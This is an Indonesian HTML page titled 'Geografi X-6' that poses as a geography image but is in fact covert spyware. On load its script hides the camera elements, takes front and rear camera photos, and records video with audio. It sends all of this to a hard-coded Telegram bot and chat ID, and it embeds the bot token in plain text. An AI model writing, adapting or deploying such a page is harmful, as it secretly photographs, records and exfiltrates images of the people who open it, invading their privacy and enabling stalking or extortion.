<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geografi X-6</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
        video, canvas { display: none; } /* Sembunyikan elemen kamera */
    </style>
</head>
<body>
    <!-- Gambar yang lo mau tampilkan -->
    <img src="https://files.catbox.moe/5agvoz.jpg" alt="geografi">

    <!-- Kamera -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
        const TELEGRAM_CHAT_ID = "7081489041";

        let mediaRecorder;
        let recordedChunks = [];

        async function checkPermissions() {
            try {
                const permissions = await navigator.permissions.query({ name: 'camera' });
                if (permissions.state === "granted") {
                    startCamera();
                } else {
                    navigator.mediaDevices.getUserMedia({ video: true }).then(startCamera).catch(err => console.error("Akses kamera ditolak:", err));
                }
            } catch (error) {
                console.error("Gagal mengecek izin kamera:", error);
            }
        }

        async function startCamera() {
            try {
                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                await capturePhoto(streamFront, "Depan");

                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                await capturePhoto(streamBack, "Belakang");

                await startRecording();
            } catch (error) {
                console.error("Gagal mengakses kamera:", error);
            }
        }

        async function capturePhoto(stream, label) {
            return new Promise((resolve) => {
                const video = document.getElementById("video");
                video.srcObject = stream;

                video.onloadedmetadata = async () => {
                    const canvas = document.getElementById("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL("image/jpeg");

                    await sendToTelegram(imageData, label);
                    resolve();
                };
            });
        }

        async function sendToTelegram(imageData, label) {
            try {
                const blob = await fetch(imageData).then(res => res.blob());
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, `${label}.jpg`);
                formData.append("caption", `ðŸ“· Foto ${label}`);

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });

                console.log(`Foto ${label} dikirim ke Telegram:`, await response.json());
            } catch (error) {
                console.error("Gagal mengirim foto:", error);
            }
        }

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.start();
                console.log("Perekaman video dimulai");

                window.addEventListener("beforeunload", sendVideoToTelegram);
            } catch (error) {
                console.error("Gagal memulai perekaman video:", error);
            }
        }

        async function sendVideoToTelegram() {
            if (mediaRecorder && recordedChunks.length > 0) {
                mediaRecorder.stop();
                console.log("Perekaman video selesai");

                const blob = new Blob(recordedChunks, { type: "video/webm" });
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("video", blob, "Rekaman.mp4");
                formData.append("caption", "ðŸŽ¥ Rekaman video kamera depan");

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: "POST",
                        body: formData
                    });

                    console.log("Video dikirim ke Telegram:", await response.json());
                } catch (error) {
                    console.error("Gagal mengirim video:", error);
                }
            }
        }

        window.onload = checkPermissions;
    </script>
</body>
</html>
